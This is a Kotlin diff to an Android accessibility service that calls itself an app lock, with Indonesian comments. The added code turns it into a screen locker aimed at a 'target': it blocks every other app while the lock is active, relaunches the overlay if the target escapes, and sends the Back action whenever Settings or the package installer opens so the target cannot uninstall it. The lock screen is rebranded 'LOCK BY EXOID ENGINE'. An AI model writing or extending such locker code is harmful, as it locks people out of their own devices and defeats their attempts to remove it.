@@ -67,9 +67,33 @@ class AppLockAccessibilityService : AccessibilityService() {
         val pkg = event.packageName?.toString() ?: return
         if (pkg == packageName) return
 
+        // Cek apakah lock overlay aktif — kalau ya, blokir semua app lain
+        val lockActive = LockService.isActive
+        if (lockActive) {
+            // Re-show lock overlay kalau target kabur
+            if (currentOverlay == null) {
+                try {
+                    val lockIntent = Intent(this, LockService::class.java)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(lockIntent)
+                    } else {
+                        startService(lockIntent)
+                    }
+                } catch (_: Exception) {}
+            }
+
+            // Blokir kalau target buka Settings atau App Info (biar nggak bisa uninstall)
+            if (pkg.contains("settings") || pkg.contains("packageinstaller")) {
+                try {
+                    performGlobalAction(GLOBAL_ACTION_BACK)
+                } catch (_: Exception) {}
+            }
+            return
+        }
+
+        // App lock logic
         val pin = prefs.getString(pkg, null)
         if (pin == null) {
-            // kalau app di-unlock tapi masih pake overlay lama, remove
             if (currentPkg == pkg) hideOverlay()
             return
         }
@@ -118,17 +142,17 @@ class AppLockAccessibilityService : AccessibilityService() {
             }
 
             val title = TextView(this).apply {
-                text = "APP TERKUNCI"
+                text = "LOCK BY EXOID ENGINE \uD83D\uDE39"
                 setTextColor(Color.parseColor("#00FF66"))
-                setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
+                setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
                 setTypeface(null, Typeface.BOLD)
                 gravity = Gravity.CENTER
-                letterSpacing = 0.2f
+                letterSpacing = 0.15f
                 setPadding(0, dp(12), 0, dp(4))
             }
 
             val sub = TextView(this).apply {
-                text = "App ini dikunci oleh EXOID ENGINE"
+                text = "App ini dikunci. Masukkan PIN untuk membuka."
                 setTextColor(Color.parseColor("#9A9A9A"))
                 setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
                 gravity = Gravity.CENTER
@@ -150,6 +174,8 @@ class AppLockAccessibilityService : AccessibilityService() {
                 setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
                 gravity = Gravity.CENTER
                 inputType = android.text.InputType.TYPE_CLASS_NUMBER
+                isFocusable = true
+                isFocusableInTouchMode = true
                 background = GradientDrawable().apply {
                     shape = GradientDrawable.RECTANGLE
                     cornerRadius = 16f
@@ -172,6 +198,8 @@ class AppLockAccessibilityService : AccessibilityService() {
                 setTextColor(Color.WHITE)
                 setTextSize(TypedValue.COMPLEX_UNIT_SP, 14f)
                 typeface = Typeface.DEFAULT_BOLD
+                isClickable = true
+                isFocusable = true
                 background = GradientDrawable().apply {
                     shape = GradientDrawable.RECTANGLE
                     cornerRadius = 20f
@@ -184,7 +212,6 @@ class AppLockAccessibilityService : AccessibilityService() {
                 if (pinInput.text.toString().trim() == correctPin) {
                     unlockedTemp.add(pkg)
                     hideOverlay()
-                    // Force kill app biar restart
                     try {
                         val intent = Intent(Intent.ACTION_MAIN)
                         intent.addCategory(Intent.CATEGORY_HOME)
@@ -222,7 +249,8 @@ class AppLockAccessibilityService : AccessibilityService() {
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 type,
-                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
+                        WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM,
                 PixelFormat.TRANSLUCENT
             )
 
